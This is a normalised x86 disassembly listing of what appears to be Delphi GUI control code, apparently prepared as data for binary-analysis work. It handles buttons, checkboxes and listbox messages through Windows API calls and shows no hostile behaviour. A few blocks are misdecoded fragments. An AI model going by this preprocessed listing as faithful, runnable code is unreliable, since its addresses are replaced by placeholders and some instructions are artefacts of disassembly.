mov ebx eax
xor eax eax
push ebp
push sub_433d55
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x168 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433d5c
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43cf20
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_453e3c
test al al
je r-xdata
mov ebx [ ebx + 0x168 ]
mov eax ebx
mov si 0xffb8
call sub_403454
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
sub_433dac
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43f400
mov eax esi
mov edx [ r-xdata ]
call sub_403408
mov [ ebx + 0x28 ] eax
pop esi
pop ebx
retn
sub_433dd0
push ebx
mov ebx eax
mov eax ebx
call sub_449250
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x28 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403408
pop edx
cmp dl [ eax + 0x69 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_433e08
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x1
xor edx edx
push ebp
push sub_433e5e
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x0
retn
sub_433e6c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43f434
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_433ec0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_4441d8
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov dl [ esi + 0x69 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
jne r-xdata
sub_433f14
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_433f38
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ edi ]
sub eax 0x201
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
sub eax 0x2
je r-xdata
mov edx edi
mov eax ebx
call sub_44111c
mov eax ebx
mov si 0xffb5
call sub_403454
test al al
jne r-xdata
sub eax 0xbb0e
je r-xdata
mov [ ebx + 0x208 ] 0x1
mov eax ebx
call sub_443708
push eax
call SetFocus
mov [ ebx + 0x208 ] 0x0
mov eax ebx
mov si 0xffb5
call sub_403454
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
sub_433fb0
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_42f548
mov ebx eax
mov eax ebx
call sub_42f628
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_443708
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_42f7c0
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_433ffc
push ebx
push esi
mov esi edx
mov ebx eax
call sub_42f548
call sub_42f628
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_441b5c
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_434028
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_440594
cmp [ ebx + 0x209 ] 0x0
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x2000
sub_434060
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_433e6c
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x4b
mov eax esi
call sub_43c6dc
mov edx 0x19
mov eax esi
call sub_43c700
mov dl 0x1
mov eax esi
call sub_44393c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax esi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_4340ec
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
mov eax ebp
call sub_443a0c
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor esi esi
mov si 0x1
jmp r-xdata
push 0x1
push edi
push 0xf4
mov eax ebp
call sub_443708
push eax
call SendMessageA
push 0xfffffff0
mov eax ebp
call sub_443708
push eax
call GetWindowLongA
and eax 0xf
movzx edi si
cmp eax edi
je r-xdata
sub_434140
push ebx
mov ebx eax
mov [ ebx + 0x210 ] dl
mov eax ebx
call sub_443a0c
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_453eac
test eax eax
je r-xdata
mov edx [ eax + 0x220 ]
push edx
xor ecx ecx
mov edx 0xb007
call sub_43e0d4
sub_434174
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_434028
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_4404c0
xor eax eax
mov al [ ebx + 0x210 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_4341dc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
cmp [ edi + 0x4 ] 0xd
jne r-xdata
cmp [ edi + 0x4 ] 0x1b
jne r-xdata
cmp [ ebx + 0x212 ] 0x0
jne r-xdata
mov edx edi
mov eax ebx
call sub_442b84
cmp [ ebx + 0x211 ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
call sub_453db4
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax ebx
mov si 0xffb8
call sub_403454
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403454
mov [ edi + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_434249
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4342c2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43cf20
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_453e3c
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_442b8c
mov eax ebx
mov si 0xffb8
call sub_403454
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403454
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4342c9
sub_4342d0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ esi + 0x8 ]
mov eax edi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
cmp ebx edi
sete al
mov [ ebx + 0x212 ] al
jmp r-xdata
mov dl [ ebx + 0x212 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov edx esi
mov eax ebx
call sub_442b94
pop edi
pop esi
pop ebx
retn
sub_434324
push ebx
push esi
mov esi edx
mov ebx eax
call sub_42f548
call sub_42f628
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_434350
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_42f548
mov ebx eax
mov eax ebx
call sub_42f628
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_443708
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_42f7c0
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43439c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_433e6c
mov edx 0x61
mov eax esi
call sub_43c6dc
mov edx 0x11
mov eax esi
call sub_43c700
mov dl 0x1
mov eax esi
call sub_44393c
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax esi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_434408
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_403454
test al al
jne r-xdata
cmp [ ebx + 0x210 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_434434
mov dl [ eax + 0x212 ]
sub dl 0x1
jb r-xdata
cmp [ eax + 0x211 ] 0x0
je r-xdata
je r-xdata
mov dl 0x1
call sub_4344bc
retn
mov dl 0x2
call sub_4344bc
jmp r-xdata
xor edx edx
call sub_4344bc
retn
dec dl
je r-xdata
retn
mov dl 0x1
call sub_4344bc
jmp r-xdata
sub_4344bc
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x212 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x212 ] dl
mov eax ebx
call sub_443a0c
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
push 0x0
xor eax eax
mov al [ ebx + 0x212 ]
push eax
push 0xf1
mov eax ebx
call sub_443708
push eax
call SendMessageA
mov eax ebx
mov si 0xffeb
call sub_403454
sub_434510
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_434028
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_4404c0
mov eax ebx
mov si 0xffc8
call sub_403454
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
xor edx edx
mov dl [ ebx + 0x210 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x5
or eax edx
mov [ edi + 0x4 ] eax
and [ edi + 0x24 ] 0xfffffffc
pop edi
pop esi
pop ebx
retn
sub_43456b
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x3eb5173d ]
add [ eax ] al
push 0x0
xor eax eax
mov al [ ebx + 0x212 ]
push eax
push 0xf1
mov eax ebx
call sub_443708
push eax
call SendMessageA
pop ebx
retn
sub_4345b4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_434642
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43cf20
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_453e3c
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_442b8c
mov eax ebx
mov si 0xffb8
call sub_403454
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov eax ebx
mov si 0xffb5
call sub_403454
test al al
je r-xdata
mov [ edi + 0xc ] 0x1
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434649
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_434660
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_433e6c
mov edx 0x71
mov eax esi
call sub_43c6dc
mov edx 0x11
mov eax esi
call sub_43c700
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax esi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_4346c8
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_403454
test al al
jne r-xdata
cmp [ ebx + 0x210 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_434708
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_440438
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4403fc
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov edi ebx
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp [ eax + 0x95 ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
xor edx edx
call sub_4494e4
sub_4347c4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x211 ]
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x211 ] bl
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44393c
mov eax [ ebp - 0x4 ]
call sub_443a0c
test al al
je r-xdata
test bl bl
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
and eax 0x7f
push eax
push 0xf1
mov eax [ ebp - 0x4 ]
call sub_443708
push eax
call SendMessageA
push ebp
call sub_434708
pop ecx
mov eax [ ebp - 0x4 ]
call sub_43cb2c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x208 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_403454
sub_434850
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_434028
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_4404c0
mov eax ebx
mov si 0xffc8
call sub_403454
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
xor edx edx
mov dl [ ebx + 0x210 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x4
or eax edx
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
retn
sub_4348a7
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x41f1173d ]
add [ eax ] al
push 0x0
xor eax eax
mov al [ ebx + 0x211 ]
push eax
push 0xf1
mov eax ebx
call sub_443708
push eax
call SendMessageA
pop ebx
retn
sub_4348dc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_434951
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43cf20
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_453e3c
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_442b8c
mov eax ebx
mov si 0xffb8
call sub_403454
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434958
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_434960
push esi
mov esi eax
mov ax [ edx + 0x6 ]
sub ax 0x1
jb r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
retn
sub ax 0x4
je r-xdata
mov eax esi
mov si 0xffe9
call sub_403454
jmp r-xdata
pop esi
retn
sub_4349ac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_434a70
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
mov al [ esi + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
push 0x0
push edi
push 0x18a
mov eax esi
call sub_443708
push eax
call SendMessageA
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_436610
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4045f4
test esi esi
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b88
mov edx [ ebp - 0x8 ]
mov ecx edi
mov eax ebx
call sub_414b28
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434a77
lea eax [ ebp - 0x8 ]
call sub_403fa8
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_404468
push eax
push edi
push 0x189
mov eax [ ebx + 0x10 ]
call sub_443708
push eax
call SendMessageA
mov esi eax
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4045f4
sub_434a80
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_434b03
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov al [ edi + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffb1
call sub_403454
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_436630
mov esi eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434b0a
lea eax [ ebp - 0x8 ]
call sub_403fa8
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b88
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_414b28
sub_434b14
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp ] ecx
mov ebp edx
mov edi eax
mov eax [ edi + 0x10 ]
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ esp + 0x4 ] eax
mov edx ebp
mov eax [ edi + 0x10 ]
mov si 0xffb3
call sub_403454
mov [ esp + 0x8 ] eax
xor ecx ecx
mov edx ebp
mov eax [ edi + 0x10 ]
mov si 0xffb2
call sub_403454
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push 0x0
mov ecx [ esp + 0x4 ]
mov edx ebp
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x64 ]
mov ecx [ esp + 0x8 ]
mov edx ebp
mov eax [ edi + 0x10 ]
mov si 0xffb2
call sub_403454
mov edx [ esp + 0x4 ]
mov eax [ edi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
sub_434b94
push esi
mov esi eax
cmp edx 0xffffffff
je r-xdata
pop esi
retn
mov eax [ esi + 0x10 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
mov eax [ esi + 0x10 ]
mov si 0xffb0
call sub_403454
sub_434bbc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_434c49
push [ fs : eax ]
mov [ fs : eax ] esp
or esi 0xffffffff
mov edi [ ebx + 0x10 ]
mov al [ edi + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434c50
lea eax [ ebp - 0x8 ]
call sub_403fa8
retn
mov eax [ ebp - 0x4 ]
call sub_404468
push eax
push 0x0
push 0x180
mov eax edi
call sub_443708
push eax
call SendMessageA
mov esi eax
test esi esi
jge r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_4039e4
sub_434c5c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_434ce5
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
mov al [ esi + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434cec
lea eax [ ebp - 0x8 ]
call sub_403fa8
retn
mov eax [ ebp - 0x4 ]
call sub_404468
push eax
push edi
push 0x181
mov eax esi
call sub_443708
push eax
call SendMessageA
test eax eax
jge r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_4039e4
sub_434d04
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_434e54
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434e5b
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fcc
retn
mov eax [ ebp - 0x4 ]
call sub_4149ac
xor eax eax
push ebp
push sub_434e32
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov si 0xffb3
call sub_403454
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx edi
mov si 0xffb3
call sub_403454
mov ecx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov si 0xffb2
call sub_403454
mov ecx [ ebp - 0xc ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
mov si 0xffb2
call sub_403454
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0xcc ]
cmp ebx eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0xcc ]
cmp edi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx edi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_414a68
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_434e74
push ebx
push esi
mov ebx edx
mov esi eax
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x10 ]
call sub_443708
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x10 ]
call sub_43d45c
sub_434ea8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x10 ]
mov al [ esi + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax edi
call sub_404468
push eax
push 0xffffffff
push 0x1a2
mov eax esi
call sub_443708
push eax
call SendMessageA
mov edx edi
mov eax esi
call sub_436658
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_434eec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_434feb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434ff2
lea eax [ ebp - 0xc ]
call sub_403fa8
retn
mov eax [ ebp - 0x4 ]
call sub_4149ac
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov [ eax + 0x278 ] 0x1
xor eax eax
push ebp
push sub_434fce
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov [ eax + 0x278 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_414a68
retn
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov si 0xffb3
call sub_403454
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
xor ecx ecx
mov edx ebx
mov si 0xffb2
call sub_403454
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov ecx [ ebp - 0xc ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
mov si 0xffb2
call sub_403454
sub_434ffc
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43f434
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x79
mov eax ebx
call sub_43c6dc
mov edx 0x61
mov eax ebx
call sub_43c700
mov dl 0x1
mov eax ebx
call sub_44393c
xor edx edx
mov eax ebx
call sub_43d0e4
mov [ ebx + 0x210 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov esi eax
mov [ ebx + 0x218 ] esi
mov [ esi + 0x10 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d734
mov esi eax
mov [ ebx + 0x228 ] esi
mov eax esi
mov edx ebx
call sub_43bafc
